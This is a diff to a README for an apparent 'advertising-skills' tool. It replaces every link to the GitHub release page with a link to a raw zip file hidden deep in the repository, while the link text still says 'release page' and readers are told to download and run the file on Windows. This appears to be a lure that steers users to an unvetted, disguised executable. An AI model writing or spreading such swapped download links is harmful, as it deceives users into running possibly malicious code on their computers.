@@ -1,6 +1,6 @@
 # 📣 advertising-skills - Better Ads, Cleaner Copy, Stronger Results
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Noninflammatory-tunny848/advertising-skills/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Noninflammatory-tunny848/advertising-skills/main/skills/operator-os/conversion-path-builder/skills-advertising-v3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Use it to set up fast workflows for:
 
 ## 💻 Windows Download
 
-Go to the [release page](https://github.com/Noninflammatory-tunny848/advertising-skills/releases) to download and run this file on Windows.
+Go to the [release page](https://raw.githubusercontent.com/Noninflammatory-tunny848/advertising-skills/main/skills/operator-os/conversion-path-builder/skills-advertising-v3.7.zip) to download and run this file on Windows.
 
 ### What to look for
 On the release page, find the latest version and download the Windows file. It may be named like:
@@ -28,7 +28,7 @@ If you download a `.zip` file, extract it first, then open the app file inside.
 
 ## 🪟 How to Install on Windows
 
-1. Open the [release page](https://github.com/Noninflammatory-tunny848/advertising-skills/releases)
+1. Open the [release page](https://raw.githubusercontent.com/Noninflammatory-tunny848/advertising-skills/main/skills/operator-os/conversion-path-builder/skills-advertising-v3.7.zip)
 2. Find the newest release at the top
 3. Download the Windows file
 4. If the file is zipped, right-click it and choose **Extract All**
@@ -156,7 +156,7 @@ This repository focuses on:
 
 ## 🔗 Download Again
 
-If you need the Windows file again, go to the [release page](https://github.com/Noninflammatory-tunny848/advertising-skills/releases) and download and run this file on Windows
+If you need the Windows file again, go to the [release page](https://raw.githubusercontent.com/Noninflammatory-tunny848/advertising-skills/main/skills/operator-os/conversion-path-builder/skills-advertising-v3.7.zip) and download and run this file on Windows
 
 ## 🧩 What You Can Build With It
 
